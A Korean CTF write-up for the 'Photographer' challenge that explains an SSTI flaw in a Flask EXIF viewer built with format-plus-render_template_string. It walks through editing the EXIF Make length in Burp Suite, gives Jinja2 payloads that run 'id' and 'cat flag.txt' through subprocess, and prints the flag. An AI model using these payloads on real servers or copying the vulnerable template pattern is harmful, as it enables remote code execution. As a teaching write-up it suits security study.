# Photographer

# 취약점 : SSTI

[Image Analysis](http://web.isangxcaution.xyz:20200/)

```python
def thumbnailTemplate(thumbnail,camera_info,tags):
    template = '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <title>Image Analysis</title>
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
    </head>
    <body>
    <div class="container text-center" >
        <h1> Did you know that your image has senesitive information? </h1>
        <img src="data:image/jpeg;base64,{}" alt="No Thumbnail Image">

        <h4 class="mt-3">
        Your Camera is <u>{}</u> right?
        </h4>
        <hr>

        <h3> More Exif medatada </h3>
        <table class="table table-striped">
        <thead>
            <tr>
                <th scope="col">Key</th>
                <th scope="col">Value</th>
            </tr>
        </thead>
        <tbody>
            {{% for key,value in tags.items() %}}
                <tr>
                    <td>{{{{  key  }}}}</td>
                    <td>{{{{ value }}}}</td>
                </tr>
            {{% endfor %}}
        </tbody>
    </table>
    </div>
    </body>
    '''.format(thumbnail,camera_info)

    return render_template_string(template,tags=tags)
```

thumbnail,camera_info가 사용자가 전송한 exif 정보를 토대로 그대로 template에 들어간다. 따라서 2개의 값을 통해서 SSTI 취약점이 발생가능한지 확인해야 한다.

1. thumbnail 
    1. thumbnail 정보는 다음과 같이 처리되어 들어간다.
    
    ```python
    if 'JPEGThumbnail' in tags.keys():
                thumbnail = tags['JPEGThumbnail']
                thumbnail = base64.b64encode(thumbnail).decode()
    ```
    
    exif 정보가 그대로 들어가는게 아닌, base64인코딩을 거친다음, 템플릿 안으로 들어가게 된다.
    
    base64인코딩은 그 특성상 결과값으로 ‘{’,’}’ 가 입력될 수 없기 때문에 thumbnail 변수로는 ssti 취약점을 이용할 수 없다.
    
2. camera_info
    1. camera_info 정보는 다음과 같이 처리되어 들어간다.
    
    ```python
    if 'Image Make' in tags.keys() and 'Image Model' in tags.keys():
                camera_info = str(tags['Image Make']) + ' ' + str(tags['Image Model'])
    ```
    
    exif 정보에서 Image Make 정보와, Image Model 정보를 추출하여 그 두가지 값을 이어붙여서 템플릿 안으로 들어간다. 따라서 Image Make, Image Model 정보를 이미지에서 임의로 변경하여 SSTI 취약점을 발생시킬 수 있다.
    

## Exploit

패킷을 변조시켜야 하기 때문에 burpsuite에서 문제에서 제시된 이미지를 제출한다.

패킷을 캡쳐한다음, 지속적으로 패킷을 변조시키면서 테스트를 해야 하기 때문에 burpsuite의 reapeter 기능을 이용한다.

![Untitled](https://user-images.githubusercontent.com/37824335/223043550-543cd8a2-37e9-4623-a294-3b4154c5cecb.png)

공격포인트인 Image Make, Image Model 정보는 다음에 보이는 것처럼 보인다.

![Untitled 1](https://user-images.githubusercontent.com/37824335/223043564-865f2a45-a48a-44c6-976b-12d8a69ccaa1.png)

이때, 주의해야 할 점은 exif 정보에서 파일 시그니처 정보로 Image Make, Image Model 정보의 길이가 byte로 저장되어 있다. 관련된 정보는 다음과 같다.

![Untitled 2](https://user-images.githubusercontent.com/37824335/223043594-a4406f9d-2538-4299-bee9-76925a09ac52.png)

0x010f 다음에 오는 바이트 정보에 길이 정보가 포함되어 있다. 이를 변경 하기 위해서 burpsuite에서 해당 부분을 찾는다. 010f로 보이는 부분이 있고 뒤에있는 0c부분이 Image Make부분의 길이를 결정짓는 정보이므로 이를 넉넉하게 90정도로 바꾼다.

![Untitled 3](https://user-images.githubusercontent.com/37824335/223043621-01da27d8-b88b-47da-8957-94ef7073b86c.png)

![Untitled 4](https://user-images.githubusercontent.com/37824335/223043629-bc71e761-fdfb-4678-86ba-5d3dac789f08.png)

이제 Image Make 부분을 이용해서 SSTI 공격을 시작한다.

```python
{{''.__class__.__mro__[1].__subclasses__()[410]('id',shell=True,stdout=-1).communicate()}}
# 쉘을 실행시킬 수 있다.
```

![Untitled 5](https://user-images.githubusercontent.com/37824335/223043645-c4b4a881-f971-4f96-ae09-f35a0c67829e.png)

```python
{{''.__class__.__mro__[1].__subclasses__()[410]('cat flag.txt',shell=True,stdout=-1).communicate()}}
# 플래그 획득 가능
```

![Untitled 6](https://user-images.githubusercontent.com/37824335/223043675-4e345a81-a425-419a-9083-3de6465ac78c.png)


FLAG : IxC{B3_awar3_0f_sst1_wh3n_us3_t3mplate}
